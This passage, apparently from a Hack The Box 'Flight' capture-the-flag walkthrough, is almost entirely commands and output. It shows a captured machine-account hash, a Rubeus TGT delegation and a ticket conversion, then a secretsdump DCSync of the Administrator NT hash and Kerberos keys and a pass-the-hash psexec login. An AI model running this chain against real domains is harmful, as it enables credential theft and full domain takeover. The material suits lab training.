G0$::flight:8311c7ecf36d7a88:5078EBE89EC39F6FE7CE7BFBB989BA37:0101000000000000805DDE69EA48DC015C0E69691EBF6991000000000200080046004F0055004E0001001E00570049004E002D0052003000560058004C0044003200470054005600440004003400570049004E002D0052003000560058004C004400320047005400560044002E0046004F0055004E002E004C004F00430041004C000300140046004F0055004E002E004C004F00430041004C000500140046004F0055004E002E004C004F00430041004C0007000800805DDE69EA48DC0106000400020000000800300030000000000000000000000000300000D3B0C920BD89034DE12263AA381834F2527F52344DE13D7F6F54BFD4275CE94D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000 

```

```bash
.\rubeus.exe tgtdeleg /nowrap
doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECkm8LJMsnDlUFtjsGSwlLmLJ5ItAY4QANZkHyxzLPA7PYq9F9xd1+f11ttbn/5pElT5bqdTutpVFpjnSRMywIyS5txC6LG4eMLaUiQZyeUOZz7f204OlDCSM1VY2Zem5ENGYz4ZI0FW6huyVKolWcsbybMnzcVTJBNYFfa+Cl6RhkjDBoqerfb7FSNn2byRKLPZU0+juluYBGCPlfDmU9VU9jjLXjTPWc+O54vb9wYk3P4Y2eyxIJ8A5tzAi6hz2td5jLu6GJ3hPP5At+vhcHYDTXRYS31Q2VlEtPWiXkh4bb1dKLXmgEL7n+6DSOtPeUfOtC1WykZTRn92AsCLwWzfJzOG8GbACQ5i3Vg8G2PNo7sxVq6xpOphCr95zuDCLU7+E9c4VqYrrH6d/e4LR9rwby8Of5uqe62ijJhL0YxJ3yE9WxaUdsgRM9SZBEEAgpweoJEUQE8hsrfGXcM1a15O+ftlfXz/haULSxecHPXtsjgnr7J1+2dnq32XHjJPLkEpxmfqkNYMi1NjSSHpKg0wP7Wy6p/HYLBRJwAwgoLYGUWK8vFW7r074DQ+WbTI5PMNZmgDRZv7LRdElEbUgqOY46UYZHNnC7mT42vz/A81m2wHXYCtPwkkpXOJ8kAZjUPHqeGYX6fiN53Hw4DsbPThciQuM1KJAWh1v6/DqyosdJOGjAt0wU94Qwnjon3wziejE39OZpj/5ruzu2+3gizmUKAyejq/0NSMXNceULJw5dfZZnYSk02Cxt1nQ0K1c16XxF/+RqqAobXQMK/W4b3ryG95BEY2I6B1obeWB6UJE8vEPGjodwvqDNvJY0BcfVLRn/KD7/paHDn4tP9R4JWo7lwXUftF+6dHh/C4cIFlhLae5/Q3N8H3/iX5w4QgzZspuZhD1NWUG/M15vL4Ag/0HsNxHyViIHoxU4dxWa6Wy9M4GsJ4Lu4EqinXzg7ccdixdG1SoIwTRSm3vnfTE2REZtAqrU4pFc3JQXACa+FHmYEv4LaihVCA184Xp+5xIAa9rVIgvaqErSlX8nx7mRjw0KtkUn2aDB2QXM90+xHe/JDQGRz8U+rDocDqmjqsgmvS4LVPMz62XWuY79sN/7d+y7gjFxEPQlfxzXtDqAbCia8RVx1l/qNNLb2V9t8Dhi22buJqf19HLCNZIuv/r1iEQNJwszcuR22k1jKDwPVpipzDpmY6FaJRlxGStTubgVCVEYQo2qp9iaR72B+CmMHr9DVPAgIO7FkpsApO3h+0wSXDx25Hy2GT2Jpn4cBYOl4NJVKYjat0OMg9kiewzU+OkXInNiRaHNa8BBToWoVmf+3DApZiOB/NE0N9Y/rCk/HQHLD4AYUpkFEck5aR+OD+t4w47ydKvTAk8o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgrpOjDaAJkqNZsSLicrmMlX6Xo6lFnCZyl7MDnscLL7GhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAzMDAyNTAzMlqmERgPMjAyNTEwMzAxMjUwMzJapxEYDzIwMjUxMTA2MDI1MDMyWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC


```

```bash
cat tgt_g0.kirbi          

doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECkm8LJMsnDlUFtjsGSwlLmLJ5ItAY4QANZkHyxzLPA7PYq9F9xd1+f11ttbn/5pElT5bqdTutpVFpjnSRMywIyS5txC6LG4eMLaUiQZyeUOZz7f204OlDCSM1VY2Zem5ENGYz4ZI0FW6huyVKolWcsbybMnzcVTJBNYFfa+Cl6RhkjDBoqerfb7FSNn2byRKLPZU0+juluYBGCPlfDmU9VU9jjLXjTPWc+O54vb9wYk3P4Y2eyxIJ8A5tzAi6hz2td5jLu6GJ3hPP5At+vhcHYDTXRYS31Q2VlEtPWiXkh4bb1dKLXmgEL7n+6DSOtPeUfOtC1WykZTRn92AsCLwWzfJzOG8GbACQ5i3Vg8G2PNo7sxVq6xpOphCr95zuDCLU7+E9c4VqYrrH6d/e4LR9rwby8Of5uqe62ijJhL0YxJ3yE9WxaUdsgRM9SZBEEAgpweoJEUQE8hsrfGXcM1a15O+ftlfXz/haULSxecHPXtsjgnr7J1+2dnq32XHjJPLkEpxmfqkNYMi1NjSSHpKg0wP7Wy6p/HYLBRJwAwgoLYGUWK8vFW7r074DQ+WbTI5PMNZmgDRZv7LRdElEbUgqOY46UYZHNnC7mT42vz/A81m2wHXYCtPwkkpXOJ8kAZjUPHqeGYX6fiN53Hw4DsbPThciQuM1KJAWh1v6/DqyosdJOGjAt0wU94Qwnjon3wziejE39OZpj/5ruzu2+3gizmUKAyejq/0NSMXNceULJw5dfZZnYSk02Cxt1nQ0K1c16XxF/+RqqAobXQMK/W4b3ryG95BEY2I6B1obeWB6UJE8vEPGjodwvqDNvJY0BcfVLRn/KD7/paHDn4tP9R4JWo7lwXUftF+6dHh/C4cIFlhLae5/Q3N8H3/iX5w4QgzZspuZhD1NWUG/M15vL4Ag/0HsNxHyViIHoxU4dxWa6Wy9M4GsJ4Lu4EqinXzg7ccdixdG1SoIwTRSm3vnfTE2REZtAqrU4pFc3JQXACa+FHmYEv4LaihVCA184Xp+5xIAa9rVIgvaqErSlX8nx7mRjw0KtkUn2aDB2QXM90+xHe/JDQGRz8U+rDocDqmjqsgmvS4LVPMz62XWuY79sN/7d+y7gjFxEPQlfxzXtDqAbCia8RVx1l/qNNLb2V9t8Dhi22buJqf19HLCNZIuv/r1iEQNJwszcuR22k1jKDwPVpipzDpmY6FaJRlxGStTubgVCVEYQo2qp9iaR72B+CmMHr9DVPAgIO7FkpsApO3h+0wSXDx25Hy2GT2Jpn4cBYOl4NJVKYjat0OMg9kiewzU+OkXInNiRaHNa8BBToWoVmf+3DApZiOB/NE0N9Y/rCk/HQHLD4AYUpkFEck5aR+OD+t4w47ydKvTAk8o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgrpOjDaAJkqNZsSLicrmMlX6Xo6lFnCZyl7MDnscLL7GhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAzMDAyNTAzMlqmERgPMjAyNTEwMzAxMjUwMzJapxEYDzIwMjUxMTA2MDI1MDMyWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```


```bash
base64 -w0 -d <tgt_g0.kirbi>TGT_G0.kirbi 
file TGT_G0.kirbi
 head -1  TGT_G0.kirbi

```


```bash
ticketConverter.py TGT_G0.kirbi TGT_G0.ccache
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done


```


```bash
hexdump -c TGT_G0.ccache
0000000 005 004  \0  \f  \0 001  \0  \b 377 377 377 377  \0  \0  \0  \0
0000010  \0  \0  \0 001  \0  \0  \0 001  \0  \0  \0  \n   F   L   I   G
0000020   H   T   .   H   T   B  \0  \0  \0 003   G   0   $  \0  \0  \0
0000030 001  \0  \0  \0 001  \0  \0  \0  \n   F   L   I   G   H   T   .
0000040   H   T   B  \0  \0  \0 003   G   0   $  \0  \0  \0 002  \0  \0
0000050  \0 002  \0  \0  \0  \n   F   L   I   G   H   T   .   H   T   B
0000060  \0  \0  \0 006   k   r   b   t   g   t  \0  \0  \0  \n   F   L
0000070   I   G   H   T   .   H   T   B  \0 022  \0  \0  \0     256 223
0000080 243  \r 240  \t 222 243   Y 261   " 342   r 271 214 225   ~ 227
0000090 243 251   E 234   &   r 227 263 003 236 307  \v   / 261   i 002
00000a0 322   x   i 002 322   x   i 003   _ 030   i  \f  \f 370  \0   `
00000b0 241  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0 004   `   a
00000c0 202 004   \   0 202 004   X 240 003 002 001 005 241  \f 033  \n
00000d0   F   L   I   G   H   T   .   H   T   B 242 037   0 035 240 003
00000e0 002 001 002 241 026   0 024 033 006   k   r   b   t   g   t 033
00000f0  \n   F   L   I   G   H   T   .   H   T   B 243 202 004       0
0000100 202 004 034 240 003 002 001 022 241 003 002 001 002 242 202 004
0000110 016 004 202 004  \n   I 274   , 223   , 234   9   T 026 330 354
0000120 031   ,   %   .   b 311 344 213   @   c 204  \0   5 231  \a 313
0000130 034 313   < 016 317   b 257   E 367 027   u 371 375   u 266 326
0000140 347 377 232   D 225   >   [ 251 324 356 266 225   E 246   9 322
0000150   D 314 260   #   $ 271 267 020 272   ,   n 036   0 266 224 211
0000160 006   r   y   C 231 317 267 366 323 203 245  \f   $ 214 325   V
0000170   6   e 351 271 020 321 230 317 206   H 320   U 272 206 354 225
0000180   * 211   V   r 306 362   l 311 363   q   T 311 004 326 005   }
0000190 257 202 227 244   a 222   0 301 242 247 253   } 276 305   H 331
00001a0 366   o   $   J   , 366   T 323 350 356 226 346 001 030   # 345
00001b0   |   9 224 365   U   = 216   2 327 215   3 326   s 343 271 342
00001c0 366 375 301 211   7   ? 206   6   {   ,   H   ' 300   9 267   0
00001d0   " 352 034 366 265 336   c   . 356 206   '   x   O   ? 220   -
00001e0 372 370   \ 035 200 323   ] 026 022 337   T   6   V   Q   -   =
00001f0   h 227 222 036 033   o   W   J   -   y 240 020 276 347 373 240
0000200 322   : 323 336   Q 363 255  \v   U 262 221 224 321 237 335 200
0000210 260   " 360   [   7 311 314 341 274 031 260 002   C 230 267   V
0000220 017 006 330 363   h 356 314   U 253 254   i   : 230   B 257 336
0000230   s 270   0 213   S 277 204 365 316 025 251 212 353 037 247 177
0000240   { 202 321 366 274 033 313 303 237 346 352 236 353   h 243   &
0000250 022 364   c 022   w 310   O   V 305 245 035 262 004   L 365   &
0000260   A 020   @     247  \a 250   $   E 020 023 310   l 255 361 227
0000270   p 315   Z 327 223 276   ~ 331   _   _   ? 341   i   B 322 305
0000280 347  \a   =   {   l 216  \t 353 354 235   ~ 331 331 352 337   e
0000290 307 214 223 313 220   J   q 231 372 244   5 203   " 324 330 322
00002a0   H   z   J 203   L 017 355   l 272 247 361 330   , 024   I 300
00002b0  \f     240 266 006   Q   b 274 274   U 273 257   N 370  \r 017
00002c0 226   m   2   9   < 303   Y 232  \0 321   f 376 313   E 321   %
00002d0 021 265     250 346   8 351   F 031 034 331 302 356   d 370 332
00002e0 374 377 003 315   f 333 001 327   `   +   O 302   I   )   \ 342
00002f0   | 220 006   c   P 361 352   x   f 027 351 370 215 347   q 360
0000300 340   ; 033   =   8   \ 211  \v 214 324 242   @   Z 035   o 353
0000310 360 352 312 213 035   $ 341 243 002 335   0   S 336 020 302   x
0000320 350 237   |   3 211 350 304 337 323 231 246   ? 371 256 354 356
0000330 333 355 340 213   9 224   (  \f 236 216 257 364   5   # 027   5
0000340 307 224   , 234   9   u 366   Y 235 204 244 323   ` 261 267   Y
0000350 320 320 255   \ 327 245 361 027 377 221 252 240   (   m   t  \f
0000360   + 365 270   o   z 362 033 336   A 021 215 210 350 035   h   m
0000370 345 201 351   B   D 362 361 017 032   : 035 302 372 203   6 362
0000380   X 320 027 037   T 264   g 374 240 373 376 226 207 016   ~   -
0000390   ? 324   x   %   j   ; 227 005 324   ~ 321   ~ 351 321 341 374
00003a0   . 034       Y   a   - 247 271 375  \r 315 360   } 377 211   ~
00003b0   p 341  \b   3   f 312   n   f 020 365   5   e 006 374 315   y
00003c0 274 276  \0 203 375  \a 260 334   G 311   X 210 036 214   T 341
00003d0 334   V   k 245 262 364 316 006 260 236  \v 273 201   * 212   u
00003e0 363 203 267 034   v   ,   ] 033   T 250   # 004 321   J   m 357
00003f0 235 364 304 331 021 031 264  \n 253   S 212   E   s   r   P   \
0000400  \0 232 370   Q 346   `   K 370   - 250 241   T       5 363 205
0000410 351 373 234   H 001 257   k   T 210   /   j 241   +   J   U 374
0000420 237 036 346   F   <   4   * 331 024 237   f 203  \a   d 027   3
0000430 335   > 304   w 277   $   4 006   G   ? 024 372 260 350   p   :
0000440 246 216 253     232 364 270   -   S 314 317 255 227   Z 346   ;
0000450 366 303 177 355 337 262 356  \b 305 304   C 320 225 374   s   ^
0000460 320 352 001 260 242   k 304   U 307   Y 177 250 323   K   o   e
0000470   } 267 300 341 213   m 233 270 232 237 327 321 313  \b 326   H
0000480 272 377 353 326   ! 020   4 234   , 315 313 221 333   i   5 214
0000490 240 360   =   Z   b 247   0 351 231 216 205   h 224   e 304   d
00004a0 255   N 346 340   T   %   D   a  \n   6 252 237   b   i 036 366
00004b0  \a 340 246   0   z 375  \r   S 300 200 203 273 026   J   l 002
00004c0 223 267 207 355   0   I   p 361 333 221 362 330   d 366   & 231
00004d0 370   p 026 016 227 203   I   T 246   #   j 335 016   2 017   d
00004e0 211 354   3   S 343 244   \ 211 315 211 026 207   5 257 001 005
00004f0   : 026 241   Y 237 373   p 300 245 230 216  \a 363   D 320 337
0000500   X 376 260 244 374   t  \a   ,   >  \0   a   J   d 024   G   $
0000510 345 244   ~   8   ? 255 343 016   ; 311 322 257   L  \t   <  \0
0000520  \0  \0  \0                                                    
0000523


```

```bash
describeTicket.py  TGT_G0.ccache
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : ae93a30da00992a359b122e272b98c957e97a3a9459c267297b3039ec70b2fb1
[*] User Name                     : G0$
[*] User Realm                    : FLIGHT.HTB
[*] Service Name                  : krbtgt/FLIGHT.HTB
[*] Service Realm                 : FLIGHT.HTB
[*] Start Time                    : 29/10/2025 22:50:32 PM
[*] End Time                      : 30/10/2025 08:50:32 AM
[*] RenewTill                     : 05/11/2025 21:50:32 PM
[*] Flags                         : (0x60a10000) forwardable, forwarded, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : rpOjDaAJkqNZsSLicrmMlX6Xo6lFnCZyl7MDnscLL7E=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/FLIGHT.HTB
[*]   Service Realm               : FLIGHT.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)

```

```bash
secretsdump.py -k -no-pass -just-dc-user Administrator 10.129.40.114
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```

```bash
sudo ntpdate -s flight.htb
```


```bash
secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322 Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465 Administrator:des-cbc-md5:c7754cb5498c2a2

```

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c administrator@g0.flight.htb
```


```bash


```









